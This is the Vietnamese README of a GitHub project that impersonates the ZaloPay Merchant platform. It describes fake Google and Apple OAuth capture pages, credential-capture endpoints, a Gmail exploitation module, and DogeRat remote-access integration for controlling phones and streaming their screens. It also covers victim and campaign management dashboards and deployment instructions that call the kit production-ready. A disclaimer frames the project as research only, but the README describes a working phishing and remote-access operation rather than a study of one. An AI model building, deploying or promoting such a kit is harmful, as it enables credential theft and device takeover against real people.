# ZaloPay Merchant Platform - Nền Tảng Nghiên Cứu Bảo Mật

[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/mariecalallen12/zalopay?quickstart=1)

## ⚠️ CẢNH BÁO QUAN TRỌNG

**Dự án này được phát triển HOÀN TOÀN cho mục đích nghiên cứu và giáo dục về bảo mật mạng.**

- ⚠️ **KHÔNG** sử dụng cho mục đích bất hợp pháp
- ⚠️ **KHÔNG** triển khai để tấn công thực tế
- ⚠️ Chỉ sử dụng trong môi trường kiểm soát và có giấy phép
- ⚠️ Người sử dụng phải tuân thủ luật pháp địa phương và quốc tế

**Tác giả và người đóng góp không chịu trách nhiệm cho bất kỳ hành vi lạm dụng nào.**

## 📊 Tổng Quan Dự Án

Dự án này là một **nền tảng nghiên cứu bảo mật** mô phỏng hệ thống ZaloPay Merchant để nghiên cứu các kỹ thuật phishing, social engineering và bảo mật web hiện đại. Được thiết kế cho các chuyên gia bảo mật mạng, nghiên cứu viên và sinh viên ngành cybersecurity.

### Mục Đích Dự Án

1. **Nghiên cứu và Phân tích**: Hiểu rõ cách thức hoạt động của các cuộc tấn công phishing tinh vi
2. **Đào tạo Bảo mật**: Cung cấp môi trường thực hành cho chuyên gia an ninh mạng
3. **Phát triển Phòng thủ**: Xây dựng và thử nghiệm các giải pháp chống phishing
4. **Nghiên cứu Học thuật**: Hỗ trợ nghiên cứu về social engineering và web security

## 🎯 Tính Năng Chính

### 1. Giao Diện Mô Phỏng (Frontend)

- ✅ **17 trang HTML** mô phỏng đầy đủ giao diện ZaloPay Merchant

- ✅ Landing page với nội dung kinh doanh chuyên nghiệp

- ✅ Các trang xác thực: Google OAuth, Apple OAuth

- ✅ Form đăng ký đa bước (7 bước) với xác thực thông tin

- ✅ Dashboard và các trang quản lý tài khoản

- ✅ Progressive Web App (PWA) với Service Worker

### 2. Backend API (Đầy Đủ Chức Năng)

- ✅ **71+ API endpoints** được triển khai hoàn chỉnh

- ✅ Xác thực admin với JWT, MFA, và quản lý sessions

### 3. Cơ Sở Dữ Liệu

- ✅ **8 models Prisma** hoàn chỉnh với PostgreSQL

### 4. Services Backend

- ✅ **12 services chuyên biệt**:

  - Authentication & Authorization
  - Credential Capture
  - Device Management (DogeRat)
  - Gmail Exploitation
  - Campaign Management
  - Screen Streaming
  - Remote Control
  - Encryption Services
  - Session Management
  - Proxy Management
  - File Storage
  - Device Fingerprinting

### 5. Real-time Communication

- ✅ **Socket.IO** với 8 handlers

### 6. Admin Dashboard

- ✅ React 18.2.0 + TypeScript

- ✅ Vite build system

- ✅ Component-based architecture

- ✅ Real-time analytics và monitoring

- ✅ Campaign management interface

- ✅ Victim data visualization

## 📁 Cấu Trúc Dự Án

```
├── Docs/                    # Tài liệu chi tiết (10 files, 13,729 dòng)
├── backend/                 # Node.js + Express backend
│   ├── routes/             # 28 route files (71+ endpoints)
│   ├── services/           # 12 service files
│   ├── repositories/       # 8 repository files
│   ├── middleware/         # 8 middleware files
│   ├── sockets/            # 8 Socket.IO handlers
│   ├── prisma/             # Database schema (8 models)
│   ├── scripts/            # Utility scripts
│   └── tests/              # Unit và integration tests
├── static/
│   ├── merchant/           # 17 HTML pages (victim interface)
│   └── admin/              # React admin interface
├── Deployment/             # Hướng dẫn deployment
└── PROJECT_COMPLETION_REPORT.md  # Báo cáo tiến độ
```

## 🚀 Hướng Dẫn Cài Đặt

### 🌩️ Triển Khai trên GitHub Codespaces (Recommended)

**Cách nhanh nhất để bắt đầu - không cần cài đặt gì!**

1. Click vào nút **Code** trên GitHub repository
2. Chọn tab **Codespaces**
3. Click **Create codespace on main**
4. Chờ 2-5 phút để Codespace tự động setup
5. Done! Backend, database, và admin UI đã sẵn sàng

📖 **Xem hướng dẫn chi tiết:** [CODESPACES_GUIDE.md](./CODESPACES_GUIDE.md)

**Lợi ích của Codespaces:**
- ✅ Không cần cài đặt Node.js, PostgreSQL, Docker
- ✅ Môi trường development nhất quán
- ✅ Tự động cấu hình và khởi động
- ✅ Truy cập từ bất kỳ đâu qua browser
- ✅ Port forwarding tự động với HTTPS

### 💻 Cài Đặt Local (Alternative)

#### Yêu Cầu Hệ Thống

- Node.js 18+ (LTS)
- PostgreSQL 14+
- npm hoặc yarn
- Git

#### Cài Đặt Bước Đầu

```bash
# Clone repository
git clone https://github.com/hoanganh-hue/b-.git
cd b-

# Cài đặt dependencies cho backend
cd backend
npm install

# Cấu hình database
cp .env.example .env
# Chỉnh sửa .env với thông tin PostgreSQL của bạn

# Tạo database và chạy migrations
npm run db:generate
npm run db:migrate
npm run db:seed

# Khởi động development server
npm run dev
```

### Biến Môi Trường (`.env`)

```bash
# Database
DATABASE_URL="postgresql://user:password@localhost:5432/dbname"

# JWT
JWT_SECRET="your-secret-key"
JWT_EXPIRES_IN="24h"

# Server
PORT=3000
NODE_ENV="development"

# Admin
ADMIN_EMAIL="admin@example.com"
ADMIN_PASSWORD="secure-password"

# OAuth (chỉ cho testing)
GOOGLE_CLIENT_ID="your-google-client-id"
GOOGLE_CLIENT_SECRET="your-google-client-secret"
```

## 📊 Trạng Thái Hoàn Thiện

### Tổng Quan

| Component | Hoàn Thiện | Chi Tiết |
|-----------|------------|----------|
| **Database** | ✅ 100% | 8/8 models đã triển khai |
| **Backend API** | ✅ 95%+ | 71+ endpoints hoạt động |
| **Frontend** | ✅ 100% | 17/17 pages hoàn chỉnh |
| **Services** | ✅ 100% | 12/12 services hoạt động |
| **Integrations** | ✅ 100% | DogeRat, Gmail, OAuth, PWA |
| **Real-time** | ✅ 100% | Socket.IO đầy đủ |
| **Admin UI** | ✅ 100% | React dashboard hoàn chỉnh |

### Chi Tiết Từng Component

#### ✅ Backend Routes (71+ Endpoints)

- `/api/admin/auth/*` - Xác thực admin (login, logout, MFA)

- `/api/admin/victims/*` - Quản lý victims (CRUD, export)

- `/api/admin/campaigns/*` - Quản lý campaigns (CRUD, statistics)

- `/api/admin/gmail/*` - Gmail exploitation (access, extract, results)

- `/api/admin/activity/*` - Activity logs & analytics

- `/api/admin/dashboard/*` - Dashboard data & analytics

- `/api/capture/*` - Credential capture endpoints

- `/api/merchant/*` - Merchant simulation APIs

- `/api/v1/devices/*` - DogeRat device management

- `/api/v1/actions/*` - Device action execution

- `/api/v1/screenControl/*` - Screen control & streaming

#### ✅ Frontend Pages (17 Pages)

1. `index.html` - Landing page ZaloPay Merchant
2. `auth_signup.html` - Trang đăng ký với OAuth
3. `auth_signup_preview.html` - Preview trước khi đăng ký
4. `google_auth.html` - Google OAuth capture
5. `apple_auth.html` - Apple OAuth capture
6. `auth_success.html` - Trang thành công
7. `auth_error.html` - Trang lỗi
8. `register.html` - Form đăng ký 7 bước
9. `dashboard.html` - Dashboard người dùng
10. `account-settings.html` - Cài đặt tài khoản
11. `transactions.html` - Lịch sử giao dịch
12. `reports.html` - Báo cáo
13. `solutions.html` - Giải pháp
14. `verify.html` - Xác minh danh tính
15. `qr-codes.html` - Mã QR
16. `faq.html` - Câu hỏi thường gặp
17. `preview-runner.html` - Preview runner

## 🛠️ Lệnh NPM

```bash
# Development
npm start              # Chạy production server
npm run dev            # Chạy development server với nodemon

# Testing
npm test               # Chạy tất cả tests
npm run test:watch     # Chạy tests ở chế độ watch
npm run test:coverage  # Tạo báo cáo coverage

# Database
npm run db:generate    # Generate Prisma client
npm run db:migrate     # Chạy database migrations
npm run db:seed        # Seed dữ liệu mẫu
npm run db:reset       # Reset database và seed lại

# Analysis
npm run analyze:completion  # Phân tích tiến độ dự án
```

## 📚 Tài Liệu Chi Tiết

Tài liệu đầy đủ có sẵn trong thư mục `Docs/`:

- **comprehensive-system-architecture (1).md** - Kiến trúc hệ thống tổng thể
- **database-schema-documentation (1).md** - Chi tiết database schema
- **system-workflow-documentation (1).md** - Workflow và quy trình
- **ui-flow-documentation.md** - UI flow và user journeys
- **SETUP_GUIDE.md** - Hướng dẫn cài đặt
- **TESTING_GUIDE.md** - Hướng dẫn testing
- **DOGERAT_API_PWA_INTEGRATION_GUIDE.md** - Hướng dẫn tích hợp DogeRat
- **DOCUMENTATION_GAP_ANALYSIS.md** - Phân tích gap trong tài liệu
- **ADMIN_INTERFACE_ANALYSIS_REPORT.md** - Phân tích admin interface
- **IMPLEMENTATION_SUMMARY.md** - Tóm tắt triển khai

## 🔧 Stack Công Nghệ

### Backend

- **Runtime**: Node.js 18+

- **Framework**: Express.js

- **Database**: PostgreSQL 14+

- **ORM**: Prisma 6.19

- **Real-time**: Socket.IO 4.5

- **Authentication**: JWT + bcryptjs

- **Testing**: Jest + Supertest

- **Validation**: express-validator

- **Logging**: Winston

### Frontend

- **Merchant UI**: HTML5, CSS3, JavaScript (Vanilla)

- **Admin UI**: React 18.2.0 + TypeScript

- **Build Tool**: Vite

- **UI Framework**: Bootstrap 5

- **PWA**: Service Worker + Web App Manifest

### Infrastructure

- **Version Control**: Git

- **Package Manager**: npm

- **Environment**: Node.js

- **Database**: PostgreSQL

## 🧪 Testing

```bash
# Chạy tất cả tests
cd backend
npm test

# Chạy tests với coverage
npm run test:coverage

# Chạy tests cho một file cụ thể
npm test -- path/to/test/file.test.js

# Watch mode (tự động chạy lại khi file thay đổi)
npm run test:watch
```

## 📈 Metrics Dự Án

- **Tổng số dòng tài liệu**: 13,729 dòng (10 files)
- **Backend routes**: 28 files (71+ endpoints)
- **Backend services**: 12 files
- **Backend repositories**: 8 files
- **Middleware**: 8 files
- **Socket handlers**: 8 files
- **Database models**: 8 models
- **Frontend pages**: 17 pages
- **Admin components**: React-based dashboard

## 🔒 Bảo Mật và Đạo Đức

### Tính Pháp Lý

- Dự án này chỉ dành cho mục đích **giáo dục và nghiên cứu**

- **KHÔNG** được phép sử dụng cho mục đích tấn công thực tế

- Người sử dụng phải tuân thủ luật pháp địa phương

- Cần có giấy phép rõ ràng khi sử dụng trong môi trường nghiên cứu

### Khuyến Nghị

1. Chỉ sử dụng trong môi trường lab được kiểm soát
2. Không thu thập dữ liệu thực từ người dùng không biết
3. Tuân thủ các quy định về quyền riêng tư (GDPR, CCPA, etc.)
4. Có sự đồng ý rõ ràng từ tất cả các bên liên quan trong nghiên cứu

## 🤝 Đóng Góp

Nếu bạn muốn đóng góp vào dự án:

1. Fork repository
2. Tạo feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Tạo Pull Request

### Guidelines

- Viết code rõ ràng và có comments
- Thêm tests cho tính năng mới
- Cập nhật tài liệu nếu cần
- Tuân thủ coding standards hiện tại

## 📄 License

ISC License - Dự án này được phát hành dưới giấy phép ISC.

## 👥 Tác Giả và Credits

- **Repository**: [hoanganh-hue/b-](https://github.com/hoanganh-hue/b-)

- **Mục đích**: Nghiên cứu và Giáo dục Bảo mật

- **Status**: Active Development

## 📞 Liên Hệ

Nếu bạn có câu hỏi về việc sử dụng dự án cho mục đích nghiên cứu học thuật hợp pháp, vui lòng liên hệ qua:

- GitHub Issues: [Create an issue](https://github.com/hoanganh-hue/b-/issues)
- Email: (thêm email nếu muốn)

## 📝 Changelog

### Phiên bản hiện tại (v1.0)

- ✅ Hoàn thiện 8/8 database models
- ✅ Triển khai 71+ API endpoints
- ✅ Hoàn thiện 17/17 frontend pages
- ✅ Tích hợp đầy đủ DogeRat API
- ✅ Gmail exploitation module (research only)
- ✅ Admin dashboard với React + TypeScript
- ✅ Socket.IO real-time communication
- ✅ PWA support với Service Worker
- ✅ GitHub Codespaces support với auto-setup

---

**Cập nhật lần cuối**: 2025-11-23

**Trạng thái**: Production-ready cho mục đích nghiên cứu

**Độ hoàn thiện**: 95%+

## 📖 Tài Liệu Deployment

### Deployment Options

Dự án hỗ trợ nhiều phương thức deployment:

1. **🌩️ GitHub Codespaces** (Recommended cho development)
   - Xem hướng dẫn chi tiết: [CODESPACES_GUIDE.md](./CODESPACES_GUIDE.md)
   - Setup tự động, không cần cài đặt
   - Môi trường cloud-based hoàn chỉnh

2. **🐳 Docker Compose** (Recommended cho production)
   - Xem hướng dẫn chi tiết: [Deployment/DEPLOYMENT_GUIDE.md](./Deployment/DEPLOYMENT_GUIDE.md)
   - Containerized deployment
   - Dễ dàng scale và maintain

3. **💻 Local Development**
   - Xem hướng dẫn chi tiết: [Docs/SETUP_GUIDE.md](./Docs/SETUP_GUIDE.md)
   - Traditional local setup
   - Full control over environment

## Database via Docker Compose

1. Copy the sample environment file and adjust the credentials/ports you need:

   ```bash
   cp docker-db.env.example docker-db.env
   ```

2. Make the helper scripts executable (one-time):

   ```bash
   chmod +x scripts/db/*.sh
   ```

3. Bootstrap the database stack (starts Postgres, runs migrations + seed, executes health-check):

   ```bash
   ./scripts/db/bootstrap.sh
   ```

4. Follow database logs at any time:

   ```bash
   ./scripts/db/tail-logs.sh
   ```

5. Stop the stack when you are done:

   ```bash
   docker compose --env-file docker-db.env -f docker-compose.db.yml down
   ```

The helper scripts rely on `docker-compose.db.yml` and the `DB_*` variables defined in `docker-db.env`. Health verification uses `npm run db:health`, which ensures all Prisma tables exist and prints row counts so you can catch missing data quickly.
